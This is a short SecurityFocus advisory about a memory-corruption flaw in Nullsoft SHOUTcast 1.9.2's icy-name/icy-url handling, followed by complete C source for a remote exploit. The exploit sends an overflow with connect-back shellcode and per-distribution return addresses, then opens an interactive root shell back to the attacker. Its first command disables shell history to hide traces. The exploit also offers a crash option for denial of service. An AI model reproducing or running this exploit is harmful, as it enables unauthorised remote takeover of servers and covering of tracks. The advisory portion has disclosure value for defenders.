source: http://www.securityfocus.com/bid/8954/info
 
Nullsoft SHOUTcast Server is prone to a memory corruption vulnerability that may lead to denial of service attacks or code execution. This is due to insufficient bounds checking of server commands supplied by authenticated users, specifically icy-name and icy-url.
 
This issue was reported in SHOUTcast 1.9.2 on Windows platforms. Other versions and platforms may also be affected.

/*           _ ________            _____                        ______
 *
 * oseen_shoucast.c( public version) - SHOUTcast v1.9.2 remote exploit   / \  / "fuck mm"
 * by exworm of oseen (www.oseen.org)             \/
 *                                         con back exploit
 * bash-2.05b# ./oseen_shoutcast -t 2 -h XXX.XXX.XXX.XXX
 * SHOUTcast v1.9.2 remote exploit by exworm of 0seen
 * --------------------------------------------------(www.oseen.org)
 * [+] lisntener...
 * [+] Connected, sending code...
 * [+] Ret: 0x0806d06b
 * [+] Eax: 0x0806d0e3
 * [+] ownedbyOseen!
 * -----------------------------------------------------------
 * Linux darkstar 2.4.20 #2 Mon Mar 17 22:02:15 PST 2003 i686 unknown
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 *(wheel),11(floppy)
 *
 *
 */

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <getopt.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <linux/sockios.h>

#define BUF 1024


struct {
        char *distro;
        char *type;
        unsigned long ret;
        unsigned long eax;

} targets[] = { /* Thanks all #oseen ;) */
        { "Slackware 8.1  ", "Shoutcast 1.9.2  ", 0x8091b28, 0x0806d0e3 },
        { "Slackware 9.0  ", "Shoutcast 1.9.2", 0x806d06b, 0x0806d0e3 },
        { "Slackware 9.1  ", "Shoutcast 1.9.2  ", 0x080d1c78, 0x0806d0e3 },
        { "Redhat 7.2     ", "Shoutcast 1.9.2", 0x080d11e0, 0xbffff344 },
        { "Crash          ", "(All platforms)  ", 0xBADe5Dee, 0x0806d0e3 },
};
char linux_connect_back[] =  /* connect back 45295 */
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";
int sock;
void usage();
void shell();

void
usage(char *prog)
{

         fprintf(stderr,"Usage: %s -t [-pah]\n",prog);
        fprintf(stderr,"-t version       Linux version.\n");
        fprintf(stderr,"-h target       The host to attack.\n");
         fprintf(stderr,"-a password     Default password is \"changeme\".\n");
        fprintf(stderr,"-p port         Default port is 8001.\n\n");
}

int
openhost(char *host,int port)
{
        struct sockaddr_in addr;
        struct hostent *he;

        he=gethostbyname(host);

        if (he==NULL) return -1;
        sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
        if (sock==-1) return -1;

        memcpy(&addr.sin_addr, he->h_addr, he->h_length);

        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);

        if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
        sock=-1;
        return sock;
}


void
shell(int sock)
{
        fd_set  fd_read;
        char buff[1024], *cmd="unset HISTFILE; /bin/uname -a;/usr/bin/id; echo '*** oseen are chinese...'\n";
        int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock, &fd_read);
                FD_SET(0,    &fd_read);

                if (select(sock+1, &fd_read, NULL, NULL, NULL) < 0) break;

                if (FD_ISSET(sock, &fd_read)) {
                        if ((n = recv(sock, buff, sizeof(buff), 0)) < 0){
                                fprintf(stderr, "[+] EOF\n");
                                exit(2);
                        }

                        if (write(1, buff, n) <0) break;
                }

                if (FD_ISSET(0, &fd_read)) {
                        if ((n = read(0, buff, sizeof(buff))) < 0){
                                fprintf(stderr,"[+] EOF\n");
                                exit(2);
                        }

                        if (send(sock, buff, n, 0) < 0) break;
                }
        }

        fprintf(stderr,"[+] Connection lost.\n\n");
        exit(0);
}

unsigned char
*get_my_ip_addr(int sockfd, struct ifreq *ifr)
{
        struct sockaddr_in sin;
        char *b = (char *) malloc(4);

        if (ioctl(sockfd ,SIOCGIFADDR,ifr) < 0) {
                fprintf(stderr, "Unable to get the local IP Address, use -d.\n");
                exit(1);
        }

        memcpy(&sin, &ifr->ifr_addr, sizeof(struct sockaddr_in));
        memcpy(b, (char *) &sin.sin_addr.s_addr, 4);
        return b;
}


int
main (int argc,char *argv[])
{
        char buf1[512];
        char buf2[512];
        char host[256];
        char pass[256]="changeme";
        char data;



        int  type= 0;
        int c=0;
        int port=8001;
        char device[256] = "ppp0";
        unsigned char *ptr;

        struct hostent *hp;
        struct sockaddr_in sin_listener;
        struct ifreq ifr;
        struct timeval timeout;

        fd_set fdread;

        int delay       = 12;
        int i           = 0;
        int mode        = 0;
        int local_port  = 0;
        int opt         = 0;
        int ret         = 0;
        int sin_len     = sizeof (struct sockaddr_in);
        int sock        = 0;
        int sock2       = 0;
        int sockd       = 0;
        int listener    = 0;
        int time_out    = 4;
        int tmp         = 0;

        srand(getpid());

        fprintf(stdout,"SHOUTcast v1.9.2 remote exploit by exworm of 0seen\n");
        fprintf(stdout,"--------------------------------------------------(www.oseen.org)\n");

        while((c=getopt(argc,argv,"h:p:a:t:")) !=EOF)
        {
                switch(c)
                {
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n\n");
                                        exit(1);
                                }
                                break;
                        case 'a':
                                memset(pass,0x0,sizeof(pass));
                                strncpy(pass,optarg,sizeof(pass) - 1);
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type > sizeof(targets) / 28) {
                                        for(i = 0; i < sizeof(targets) / 28; i++)
                                        fprintf(stderr, "%02d. %s - %s      [0x%08x - 0x%08x]\n",
                                                i + 1, targets[i].distro, targets[i].type, targets[i].ret, targets[i].eax);
                                        return -1;
                                }
                                break;
                        case 'h':
                                memset(host,0x0,sizeof(host));
                                strncpy(host,optarg,sizeof(host) - 1);
                                break;

                        default:
                                usage(argv[0]);
                                exit(1);
                                break;
                }
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;

        if (strlen(host) == 0) {
                usage(argv[0]);
                exit(1);
        }
        sock=openhost(host, 8001);

        if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

        strncpy(ifr.ifr_name, device, 15);

        if ((sockd = socket(AF_INET, SOCK_DGRAM, 17)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        if ((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        ptr = get_my_ip_addr(sockd, &ifr);
       memcpy(&sin_listener.sin_addr.s_addr, ptr, 4);

        sin_listener.sin_family = AF_INET;
        memset(&sin_listener.sin_zero, 0x00, 8);

        while(1) {
                local_port = local_port = 45295;
                sin_listener.sin_port = htons(local_port);
                if (!bind(listener, (struct sockaddr *) &sin_listener, sin_len)) break;
        }



        listen(listener, 1);
        fprintf(stdout, "[+] lisntener...\n");

        linux_connect_back[33] = (unsigned int) *(ptr + 0);
        linux_connect_back[34] = (unsigned int) *(ptr + 1);
        linux_connect_back[35] = (unsigned int) *(ptr + 2);
        linux_connect_back[36] = (unsigned int) *(ptr + 3);


        write(sock, pass, strlen(pass));
        write(sock, "\n", 1);

        memset(buf2,  0x0, sizeof(buf2));
        memset(buf1, 0x90, sizeof(buf1));

        for(i=0;i < strlen(linux_connect_back); i++) buf1[i+50] = linux_connect_back[i];

        buf1[191] = (targets[type - 1].ret & 0x000000ff);
        buf1[192] = (targets[type - 1].ret & 0x0000ff00) >> 8;
        buf1[193] = (targets[type - 1].ret & 0x00ff0000) >> 16;
        buf1[194] = (targets[type - 1].ret & 0xff000000) >> 24;

        buf1[199] = (targets[type - 1].eax & 0x000000ff);
        buf1[200] = (targets[type - 1].eax & 0x0000ff00) >> 8;
        buf1[201] = (targets[type - 1].eax & 0x00ff0000) >> 16;
        buf1[202] = (targets[type - 1].eax & 0xff000000) >> 24;

        buf1[308] = (targets[type - 1].eax & 0x000000ff);
        buf1[309] = (targets[type - 1].eax & 0x0000ff00) >> 8;
        buf1[310] = (targets[type - 1].eax & 0x00ff0000) >> 16;
        buf1[311] = (targets[type - 1].eax & 0xff000000) >> 24;

        sprintf(buf2,   "icy-name:%s\r\n", buf1);

        fprintf(stdout, "Connected, sending code...\n");
        fprintf(stdout, "[+] Ret: 0x%08x\n", targets[type - 1].ret);
        fprintf(stdout, "[+] Eax: 0x%08x\n", targets[type - 1].eax);
        while(1) {
                write(sock, buf2, strlen(buf2));
                sleep(2);
                FD_ZERO(&fdread);
                FD_SET(listener, &fdread);

                timeout.tv_sec = time_out;
                timeout.tv_usec = 0;

                while(1) {

                        ret = select(FD_SETSIZE, &fdread, NULL, NULL, &timeout);

                        if (ret < 0) {
                                close(sock);
                                close(listener);
                                fprintf(stderr, "select() error.\n");
                                return -1;
                        }

                        if (ret == 0) {
                                fprintf(stderr, "[+] Failed, waiting %d seconds.\n"
                                                "[+] Use ctrl-c to abort.\n", delay);
                                sleep(delay);
                                break;
                        }

                        if(FD_ISSET(listener, &fdread)) {
                                sock2 = accept(listener, (struct sockaddr *)&sin_listener, &sin_len);
                                close(sock);
                                close(listener);

                                fprintf(stderr, "[+] ownedbyOseen!\n"
                                                "-----------------------------------------------------------\n");
                                shell(sock2);
                                close(sock2);
                                return 0;
                        }
                }

        }

        fprintf(stderr, "[+] Exploit failed.\n");
        close(listener);
        close(sock);
        return 0;

}
